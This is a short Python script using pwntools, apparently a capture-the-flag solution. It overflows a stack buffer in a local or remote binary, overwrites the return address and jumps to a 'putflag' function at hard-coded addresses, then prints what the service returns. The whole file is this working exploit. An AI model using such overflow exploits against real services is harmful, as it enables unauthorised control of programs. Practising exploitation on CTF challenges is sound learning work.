#!/usr/bin/python3
import pwn, sys

if __name__ == '__main__':
    target = None

    if len(sys.argv) != 3:
        target = pwn.process(sys.argv[1])  # Use local file
    else:
        server = sys.argv[1]
        port = int(sys.argv[2])
        target = pwn.remote(server, port)  # Connect to the server

    return_addr = pwn.p64(0x401a11)
    putflag_addr = pwn.p64(0x4017f5)
    attack = b'0' * 24 + return_addr + b'0' * 8 + putflag_addr 
    target.sendline(attack)
    a = target.recvuntil(b'?')
    print(target.recvall().decode("utf-8", "ignore").strip())
